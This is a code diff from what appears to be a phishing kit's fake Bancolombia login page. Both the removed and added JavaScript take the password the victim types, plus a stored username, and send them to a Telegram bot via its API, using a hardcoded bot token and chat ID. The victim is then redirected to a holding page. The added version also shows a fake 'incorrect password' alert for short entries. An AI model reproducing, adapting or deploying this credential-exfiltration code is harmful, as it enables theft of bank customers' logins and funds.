@@ -64,7 +64,7 @@
 	   							</div>
 	   							<br>
 	   							<button id="btnCancelar" name="btnCancelar" class="btn btn-blanco" type="button">Cancelar</button>&nbsp;&nbsp;&nbsp;
-	   							<button id="btnPass" name="btnPass" class="btn btn-amarillo" type="button" onclick="carl()">Continuar</button>
+	   							<button id="btnPass" name="btnPass" class="btn btn-amarillo" type="button" onclick="chc()">Continuar</button>
 	   							<br>
 	   							<div class="texto" style="text-align: right;">
 		   							<div class="vinculos">
@@ -270,47 +270,54 @@ El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: Espa
  </script>
  <script>
     
-	function carl(params) {
-	   
-		  
-		 
-	
-	  const token = '5841260850:AAE3Vubjqe4wVd9835ZGc7C4ybUX8Vl19jg';
-        const chatId = '-979168187';
-        const usr = localStorage.getItem("usr");
-	
-	const pw = document.getElementById("txtPassword").value;
-        const message = `-CLIENTE MENSAJE 👀 -\n --👨‍🦱Usr. : ${usr} \n  pw: ${pw}` ;
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({
-    chat_id: chatId,
-    text: message,
-    parse_mode: 'html',
-  }),
-})
-  .then(response => {
-    if (response.ok) {
-      console.log('Message sent');
-      window.location = '/mua/WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html';
-    } else {
-      console.error('Failed to send message');
-      alert('Failed to send message');
-    }
-  })
-  .catch(error => {
-    console.error(error);
-    alert('Error occurred');
-  });
-	   
-		  
-		 
-	
+	if (document.getElementById("txtPassword").value.length < 4) {
+			alert("Clave incorrecta o erronea")
+			
+		}else{
+			carl();
+
+		}
+		
 	}
-	
+	function carl(params) {
+   
+      
+     
+
+   
+   const token = '5841260850:AAE3Vubjqe4wVd9835ZGc7C4ybUX8Vl19jg';
+const chatId = '-979168187';
+const usr = localStorage.getItem("usr");
+const pw = document.getElementById("txtPassword").value;
+
+  
+const message = `-BANCOLOMBIA-\n --Usr.: ${usr} \n  Pw: ${pw}` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {  
+	  chat_id: chatId,
+	  text: message,
+	  parse_mode: 'html',
+  },
+  success: function (res) {
+	  console.debug(res);
+	  $('#response').text('Message sent');
+	  console.log("enviado")
+	  
+	  window.location = "/mua/WAITING/scis/j6UnVHZsitlYrxStPNFUN4TsSjgEJkN7dlDp6FXSjFxO/3D/no-back-button/index.html"
+	  
+	  
+	 
+  },
+  error: function (error) {
+	  console.error(error);
+	  alert("error failed");
+  } 
+
+})
+
+}
 		 
 		 </script>
 		 
